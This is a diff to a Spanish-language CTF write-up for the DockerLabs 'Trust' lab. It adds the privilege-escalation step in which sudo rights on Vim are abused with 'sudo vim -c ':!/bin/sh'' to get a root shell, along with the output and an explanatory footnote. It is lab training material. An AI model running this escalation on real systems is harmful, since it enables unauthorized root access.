@@ -175,6 +175,14 @@ Matching Defaults entries for mario on 99ebdb36daec:
 User mario may run the following commands on 99ebdb36daec:
     (ALL) /usr/bin/vim
 ```
-Sabiendo que podemos ejecutar Vim con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
-![GTFOBins vim]()
+Sabiendo que podemos ejecutar Vim[^1] con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
+![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/6be73eb8c1de22d9b38e2720c90c945007edde78/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_GTFOBinsvim.png)
+```ruby
+mario@99ebdb36daec:~$ sudo vim -c ':!/bin/sh'
+
+# whoami
+root
+# 
+```
 🥳CONSEGUIDO, SOMOS ROOT🥳
+[^1]: Vim es un editor de texto para sistemas Unix/Linux que, al poder ejecutarse con sudo, se convierte en una vía de escalada de privilegios porque permite lanzar comandos de sistema desde dentro del editor (por ejemplo con :!bash), lo que posibilita abrir una shell con permisos de root.
